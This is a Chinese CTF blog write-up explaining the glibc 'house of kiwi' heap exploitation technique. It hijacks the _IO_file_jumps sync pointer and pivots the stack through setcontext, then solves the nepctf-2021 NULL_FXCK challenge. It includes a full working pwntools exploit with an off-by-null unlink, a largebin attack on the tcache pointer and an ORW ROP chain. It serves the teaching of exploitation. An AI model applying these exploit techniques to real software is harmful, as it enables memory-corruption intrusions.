
### house of kiwi


## **前言：house\_of\_kiwi 一般是通过触发\_\_malloc\_assert来刷新IO流，最后可以劫持程序流或者通过和setcontext来打配合来进行栈迁移来得到flag。**


**我们看看触发的源码**



```
#if IS_IN (libc)
#ifndef NDEBUG
# define __assert_fail(assertion, file, line, function)			\
	 __malloc_assert(assertion, file, line, function)

extern const char *__progname;

static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
		 const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
		     __progname, __progname[0] ? ": " : "",
		     file, line,
		     function ? function : "", function ? ": " : "",
		     assertion);
  fflush (stderr);
  abort ();
}
#endif
#endif
```

**可以看见**\_\_malloc\_assert调用了`__fxprintf`和`fflush`，而这个函数调用后会调用`_IO_file_jumps`中的`sync`指针。****


****这个指针在`_IO_file_jumps`偏移为0x60的位置，那么将这个指针进行劫持，就能达到我们想要的目的，如果题目禁用了execve的话，可以考虑通过setcontext来实现栈迁移****


****我们看一下这个这个函数****



```
text:0000000000053030 ; __unwind {
.text:0000000000053030                 endbr64
.text:0000000000053034                 push    rdi
.text:0000000000053035                 lea     rsi, [rdi+128h] ; nset
.text:000000000005303C                 xor     edx, edx        ; oset
.text:000000000005303E                 mov     edi, 2          ; how
.text:0000000000053043                 mov     r10d, 8         ; sigsetsize
.text:0000000000053049                 mov     eax, 0Eh
.text:000000000005304E                 syscall                 ; LINUX - sys_rt_sigprocmask
.text:0000000000053050                 pop     rdx
.text:0000000000053051                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000053057                 jnb     loc_5317F
.text:000000000005305D                 mov     rcx, [rdx+0E0h]
.text:0000000000053064                 fldenv  byte ptr [rcx]
.text:0000000000053066                 ldmxcsr dword ptr [rdx+1C0h]
.text:000000000005306D                 mov     rsp, [rdx+0A0h]          //这里将rdx+0xa0的值赋值给了rsp，也就是我们控制了rdx就控制了rsp
.text:0000000000053074                 mov     rbx, [rdx+80h]
.text:000000000005307B                 mov     rbp, [rdx+78h]
.text:000000000005307F                 mov     r12, [rdx+48h]
.text:0000000000053083                 mov     r13, [rdx+50h]
.text:0000000000053087                 mov     r14, [rdx+58h]
.text:000000000005308B                 mov     r15, [rdx+60h]
.text:000000000005308F                 test    dword ptr fs:48h, 2
.text:000000000005309B                 jz      loc_53156
.text:00000000000530A1                 mov     rsi, [rdx+3A8h]
.text:00000000000530A8                 mov     rdi, rsi
.text:00000000000530AB                 mov     rcx, [rdx+3B0h]
.text:00000000000530B2                 cmp     rcx, fs:78h
.text:00000000000530BB                 jz      short loc_530F5
.text:00000000000530BD
.text:00000000000530BD loc_530BD:                              ; CODE XREF: setcontext+9E↓j
.text:00000000000530BD                 mov     rax, [rsi-8]
.text:00000000000530C1                 and     rax, 0FFFFFFFFFFFFFFF8h
.text:00000000000530C5                 cmp     rax, rsi
.text:00000000000530C8                 jz      short loc_530D0
.text:00000000000530CA                 sub     rsi, 8
.text:00000000000530CE                 jmp     short loc_530BD
.text:00000000000530D0 ; ---------------------------------------------------------------------------
.text:00000000000530D0
.text:00000000000530D0 loc_530D0:                              ; CODE XREF: setcontext+98↑j
.text:00000000000530D0                 mov     rax, 1
.text:00000000000530D7                 incsspq rax
.text:00000000000530DC                 rstorssp qword ptr [rsi-8]
.text:00000000000530E1                 saveprevssp
.text:00000000000530E5                 mov     rax, [rdx+3B0h]
.text:00000000000530EC                 mov     fs:78h, rax
.text:00000000000530F5
.text:00000000000530F5 loc_530F5:                              ; CODE XREF: setcontext+8B↑j
.text:00000000000530F5                 rdsspq  rcx
.text:00000000000530FA                 sub     rcx, rdi
.text:00000000000530FD                 jz      short loc_5311C
.text:00000000000530FF                 neg     rcx
.text:0000000000053102                 shr     rcx, 3
.text:0000000000053106                 mov     esi, 0FFh
.text:000000000005310B
.text:000000000005310B loc_5310B:                              ; CODE XREF: setcontext+EA↓j
.text:000000000005310B                 cmp     rcx, rsi
.text:000000000005310E                 cmovb   rsi, rcx
.text:0000000000053112                 incsspq rsi
.text:0000000000053117                 sub     rcx, rsi
.text:000000000005311A                 ja      short loc_5310B
.text:000000000005311C
.text:000000000005311C loc_5311C:                              ; CODE XREF: setcontext+CD↑j
.text:000000000005311C                 mov     rsi, [rdx+70h]
.text:0000000000053120                 mov     rdi, [rdx+68h]
.text:0000000000053124                 mov     rcx, [rdx+98h]
.text:000000000005312B                 mov     r8, [rdx+28h]
.text:000000000005312F                 mov     r9, [rdx+30h]
.text:0000000000053133                 mov     r10, [rdx+0A8h]
.text:000000000005313A                 mov     rdx, [rdx+88h]
.text:0000000000053141                 rdsspq  rax
.text:0000000000053146                 cmp     r10, [rax]
.text:0000000000053149                 mov     eax, 0
.text:000000000005314E                 jnz     short loc_53153
.text:0000000000053150                 push    r10
.text:0000000000053152                 retn
.text:0000000000053153 ; ---------------------------------------------------------------------------
.text:0000000000053153
.text:0000000000053153 loc_53153:                              ; CODE XREF: setcontext+11E↑j
.text:0000000000053153                 jmp     r10
.text:0000000000053156 ; ---------------------------------------------------------------------------
.text:0000000000053156
.text:0000000000053156 loc_53156:                              ; CODE XREF: setcontext+6B↑j
.text:0000000000053156                 mov     rcx, [rdx+0A8h]  //也可以控制到rcx
.text:000000000005315D                 push    rcx               //控制到rip
.text:000000000005315E                 mov     rsi, [rdx+70h]
.text:0000000000053162                 mov     rdi, [rdx+68h]
.text:0000000000053166                 mov     rcx, [rdx+98h]
.text:000000000005316D                 mov     r8, [rdx+28h]
.text:0000000000053171                 mov     r9, [rdx+30h]
.text:0000000000053175                 mov     rdx, [rdx+88h]
.text:0000000000053175 ; } // starts at 53030
.text:000000000005317C ; __unwind {
.text:000000000005317C                 xor     eax, eax
.text:000000000005317E                 retn
```

**也就是说控制到rdx \+ 0xa0 和rdx \+ 0xa8的位置就可以实现栈迁移，那么就要搞清楚，调用这个指针的时候，rdx是什么,那么就需要调试一下**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910135459034-1831903992.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910135459034-1831903992.png)**


**调用了fflush**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910135916067-1174633673.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910135916067-1174633673.png)**


**这里sync指针已经被我修改变成了setcontext\+61的地址**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910140002274-1838616609.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910140002274-1838616609.png)**


**而此时的rdx是 IO\_helper\_jumps的地址**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910140201072-1884939081.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910140201072-1884939081.png)**


**那么劫持到 IO\_helper\_jumps \+ 0xa0即可劫持程序流**


## **小结：想要达到house\_of\_kiwi需要至少两次任意地址改，修改sync指针，以及**IO\_helper\_jumps \+0xa0和0xa8的位置，然后就可以劫持到程序流了，对于2\.27以上堆题目来说可以通过劫持tcache bin 结构体来达到任意地址分配，进而达到目的。****


**相比较其他的house\_of系列kiwi要求的条件也比较苛刻，但是它的利用手法并不难，在能满足这个条件的情况下，这种手法还是非常不错的。**


## **例题：nepctf\-2021 NULL\_FXCK**


**题目链接：[题目](https://github.com)提取码：k5h6**


**ida逆向分析**


**add函数规定了申请chunk有大小的限制，最小0x100，最大0x2000**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910194908326-132930920.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910194908326-132930920.png)**


**edit函数存在off\_by\_null漏洞，但是只能使用一次**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910194842502-1275553514.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910194842502-1275553514.png)**


**show函数存在截断**


**free函数没有UAF漏洞**


**分析：只有一个off\_by\_null漏洞，只能使用一次，那么可以通过unlink实现堆块重叠，达到泄露地址的目的，但是本题libc是2\.32的libc，还是存在\_malloc\_hook这些钩子，但是这些被ban掉了，而且开了沙箱保护，我们只能orw读取flag，那么就可以从上面house\_of\_kiwi下手。首先要做的是unlink，但是这样就需要伪造fd指针和bk指针，以前我们一般是将fd和bk指针指向自身来绕过unlink检查，但是现在我们不能泄露地址，也就是要在无法泄露地址的情况下完成unlink**


**那么我们可以申请6个堆块，free 0，3，5堆块，那么堆块3的fd和bk就已经确定了，此时想要达到堆块重叠，可以把chunk3的size改大（改到top\_chunk这样下次在top\_chunk申请堆块时候，free时候，会向上合并），怎么来呢，free掉chunk2，然后chunk2和chunk3会合并，然后申请堆块修改chunk3的size，那么此时，链表就被破坏了**


**free 0，3，5**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202520917-1426703431.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202520917-1426703431.png)**


**chunk2和chunk3合并**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202555232-2002728228.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202555232-2002728228.png)**


**chunk3size被修改，同时它的fd和bk指针已经设置好了**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202629686-588878874.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202629686-588878874.png)**


**此时，剩下两个chunk加入到了largebin中，我们申请出来，但是怎么修改它们的fd和bk指针呢**


[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202658837-1880588532.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202658837-1880588532.png):[楚门加速器p](https://tianchuang88.com)


**注意看刚刚chunk3和chunk2合并之后剩下的chunk（称为left\_chunk），它的地址只有最低位和chunk3不一样，而且chunk3的地址末位是0，这个是一开始布局的时候这样布置的，因为add有截断，我们可以通过free这个left\_chunk和chunk0以前和chunk5来构成链子，最后通过add截断修改掉fd或者bk指针**


[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202923078-1143309769.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910202923078-1143309769.png)


**这里以chunk0为例子，注意他的fd是chunk3\+0x20的位置，那么如果截断一下就是chunk3了**


[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910203743142-1403970523.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910203743142-1403970523.png)


**同理chunk5也是一样，那么完成这个再伪造一下prev\_size即可完成unlink，即可申请堆块达到堆块重叠，泄露地址，但是存在00截断，还需要加入到largebin中泄露libc地址以及heap地址**


**那么现在泄露地址的问题解决了，还需要实现任意地址写，那么这里涉及一个知识，我们知道管理tcachebin链表是一个结构体在heap起始处**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910204311146-480753226.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910204311146-480753226.png)**


**其实这个在tls里面有一个指针指向它只是被映射成了这个地址，我们可以找一下**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910204526845-1874284413.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910204526845-1874284413.png)**


**那么通过largebin 劫持这个地址即可劫持到tcachebin链表实现任意地址写，接下来就是house\_of\_kiwi，实现栈迁移，提前把orw链子写入到chunk里面**


**EXP：**



```
from gt import *

con("amd64")
libc = ELF("./libc-2.32.so")

io = process("./NULL_FXCK")

def add(size,msg='\x00'):
    io.sendlineafter(">> ",'1')
    io.sendlineafter("(: Size: ",str(size))
    io.sendafter("(: Content: ",msg)


def edit(index,msg):
    io.sendlineafter(">> ",'2')
    io.sendlineafter("Index: ",str(index))
    io.sendafter("Content: ",msg)



def free(index):
    io.sendlineafter(">> ",'3')
    io.sendlineafter("Index: ",str(index))



def show(index):
    io.sendlineafter(">> ",'4')
    io.sendlineafter("Index: ",str(index))



add(0x418) #0
add(0x1f8) #1
add(0x428) #2
add(0x438) #3
add(0x208) #4
add(0x428) #5
add(0x208) #6


free(0)   
free(3)
free(5)
gdb.attach(io)
free(2) #chunk3 chunk2 he bing
payload = b'a'*0x428 + p64(0xc91)
add(0x440,payload) #0
#gdb.attach(io)
add(0x418) #2 chunk3 chunk2 leave part
add(0x418) #3  yuanxian chunk0
add(0x428) #5 yuanxian chunk5

free(3)
free(2)
#gdb.attach(io)
add(0x418,'a'*9) #2
add(0x418) #3
free(3)
free(5)
add(0x9f8) #3
add(0x428,'a') #5
payload = b'a'*0x200 + p64(0xc90) + b'\x00'
edit(6,payload)
#gdb.attach(io)
add(0x418)
add(0x208) # fangzhi top_chunk

free(3)
payload = p64(0) *3 + p64(0x421)
add(0x430,payload)
add(0x1600)
show(4)
libc_base = u64(io.recv(6).ljust(8,b'\x00')) -0x6a0 -libc.sym["__malloc_hook"]
suc("libc_base",libc_base)

show(5)
heap_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x2b0
suc("heap_base",heap_base)
#gdb.attach(io)
tls_truct = libc_base + 0x1eb578
suc("tls_truct",tls_truct)
open = libc_base + libc.sym["open"]
read = libc_base + libc.sym["read"]
write = libc_base + libc.sym["write"]
setcontext  = libc_base + libc.sym["setcontext"]
pop_rdi = libc_base + 0x000000000002858f#: pop rdi; ret; 
pop_rsi = libc_base + 0x000000000002ac3f#: pop rsi; ret;
pop_rdx_r12 = libc_base + 0x0000000000114161#: pop rdx; pop r12; ret;
IO_file_jumps = libc_base + 0x1e54c0
IO_hleper_jumps = libc_base + 0x1e48c0
suc("IO_hleper_jumps",IO_hleper_jumps)
ret = libc_base + 0x0000000000026699 #: ret; 

payload = b'b'*0x208 + p64(0x431) + b'b'*0x428 + p64(0x211) + b'a'*0x208 + p64(0xa01)
add(0x1240,payload)

free(0) # orw_addr
flag_addr = heap_base + 0x8e0 + 0x100
orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open)
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr + 0x100) + p64(pop_rdx_r12) + p64(0x40)*2 + p64(read)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr + 0x100) + p64(pop_rdx_r12) + p64(0x40)*2 + p64(write)
orw = orw.ljust(0x100,b'a')
orw += b'flag\x00\x00\x00\x00'

add(0x440,orw) #0
add(0x418) #11
add(0x208) #12

free(5) #unlink big  chunk
free(4) # large_bin attack chunk 
# chunk5 ----> largebin

payload = b'a'*0x208 + p64(0x431) + p64(libc_base + 0x1e3ff0)*2 + p64(heap_base + 0x1350)
payload += p64(tls_truct - 0x20)

add(0x1240,payload)
free(11)
add(0x500) # wancheng large_bin attack

add(0x410) #11
free(4)
payload = b'a'*0x208 + p64(0x431) + p64(libc_base + 0x1e3ff0)*2 + p64(heap_base + 0x1350)*2
add(0x1240,payload)

fake_tcache = b'\x07\x00' * 0x35
fake_tcache = fake_tcache.ljust(0xe8,b'\x00') + p64(IO_file_jumps + 0x60)
fake_tcache = fake_tcache.ljust(0x168,b'\x00') + p64(IO_hleper_jumps + 0xa0)
fake_tcache +=  p64(heap_base + 0x46f0) #top_chunk
add(0x420,fake_tcache)
add(0x100,p64(setcontext+61))
add(0x200,p64(heap_base + 0x8e0)+p64(ret))
add(0x210,p64(0x999))
gdb.attach(io)
add(0x1000)
#gdb.attach(io)
io.interactive()
```

**最后效果**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910204909438-688353297.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240910204909438-688353297.png)**


 \_\_EOF\_\_

   ![](https://github.com/CH13hh)CH13hh  - **本文链接：** [https://github.com/CH13hh/p/18405448](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
